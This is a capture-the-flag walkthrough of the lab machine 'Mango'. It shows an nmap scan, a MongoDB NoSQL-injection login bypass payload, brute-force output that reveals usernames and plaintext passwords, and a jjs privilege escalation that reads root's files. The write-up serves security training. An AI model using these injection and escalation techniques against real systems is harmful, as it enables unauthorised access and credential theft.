# Mango

<table>
  <tr>
    <td style="text-align:right;"><b>OS</b></td>
    <td>Linux</td>
  </tr>
  <tr>
    <td style="text-align:right;"><b>Difficulty</b></td>
    <td>Medium</td>
  </tr>
  <tr>
    <td style="text-align:right;"><b>Points</b></td>
    <td>30</td>
  </tr>
  <tr>
    <td style="text-align:right;"><b>Release</b></td>
    <td>26 Oct 2019</td>
  </tr>
  <tr>
    <td style="text-align:right;"><b>IP</b></td>
    <td>10.10.10.162</td>
  </tr>
</table>

## Foothold

To begin, we will add the entry `10.10.10.162 mango.htb` to `/etc/hosts` and then start scanning.

```
# nmap -sC -sV mango.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-30 17:28 EDT
Nmap scan report for mango.htb (10.10.10.162)
Host is up (0.037s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From this, we see that SSH, HTTP, and HTTPS are open. An additional port scan on all ports on the machine did not find anything new. Now, we can begin to look at web pages.

Browsing to http://mango.htb:80, we get a 403 FORBIDDEN error, so not much else to see here. That leaves the HTTPS site, so we will browse to https://mango.htb:443. We initially get a "Potential Security Risk Ahead" warning which is strange, but we will proceed anyone and are met with a Google-like landing page.

![](images/mango-landing.png)

Trying to use it as a search engine yields no results but we see that there is a user signed in. Clicking on the analytics tab redirects to https://mango.htb/analytics.php. After much looking around and researching this page, it appears to be a rabbit hole. With no more links on the page and no directory busting working, there must be something that we are overlooking.

If we look more closely at our nmap results, we see a similar but different URL listed for port 443 - staging-order.mango.htb. If we try browsing to it at first it doesn't work, we need to also add it to our hosts file.

![](images/login.png)

## User

From here it is clear that we need to do some sort of injection to get user credentials. The box name gives us a big hint about this. The database powering this login in MongoDB.

In order to learn more about injection with MongoDB, we can look at the [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection) repository. We can use one of the payloads listed and try to login. For this we can utilize Burp Suite. We will intercept the payload from the site and replace it with `username[$ne]=toto&password[$ne]=toto`.

![](images/under-plantation.png)

Since our payload worked, we have verified that is actually MongoDB behind the scenes. However, the page we log in to is just a maintenance screen without any real information, we will have to research further.

From [this blogpost](https://book.hacktricks.xyz/pentesting-web/nosql-injection) about NoSQL injection, we see that there is more to injection here than just login bypassing. We are actually able to extract user logins and even brute-force their passwords relatively easy. 

To do this, we will use their sample script to brute-force login usernames and passwords from POST login. We will have to add our own variables and obtain a sample session ID from Burp Suite.

```
# /usr/bin/python brute-force.py
Found username starting with a
^ad
^adm
^admi
^admin
Found username: admin
Found username starting with m
^ma
^man
^mang
^mango
Found username: mango
Extracting password of admin
Found password t9KcS3>!0B#2 for username admin
Extracting password of mango
Found password h3mXK8RhU~f{]f5H for username mango
```

We can now try to SSH onto the box with these credentials. User admin does not work but mango does. We can see why this is this case if we look at the SSHD configuration. While we can't SSH to admin, we are able to simply switch to them while we are on the box and then read the flag.

```
# ssh mango@mango.htb
mango@mango.htb's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)
...
mango@mango:~$ cat /etc/ssh/sshd_config 
...
AllowUsers mango root
mango@mango:~$ su admin
Password: 
$ cd
$ ls
user.txt
$ cat user.txt
79bf31**************************
```

## Root

From here, we can begin enumeration for root. There aren't any other files laying around so we will use the LinEnum script.

```
$ ./LinEnum.sh
...
[+] Possibly interesting SGID files:
-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
...
```

Admin is able to run this file as root which is very promising. There is an entry for `jjs` on [GTFOBins](https://gtfobins.github.io/gtfobins/jjs/). One such thing we can do is make arbitrary reads/writes to the system. If we wanted some persistence, we could write our SSH key to root's authorized keys. Since we just need the flag, we can read it.

```
$ echo 'var BufferedReader = Java.type("java.io.BufferedReader");
> var FileReader = Java.type("java.io.FileReader");
> var br = new BufferedReader(new FileReader("/root/root.txt"));
> while ((line = br.readLine()) != null) { print(line); }' | jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> var BufferedReader = Java.type("java.io.BufferedReader");
jjs> var FileReader = Java.type("java.io.FileReader");
jjs> var br = new BufferedReader(new FileReader("/root/root.txt"));
jjs> while ((line = br.readLine()) != null) { print(line); }
8a8ef7**************************
```
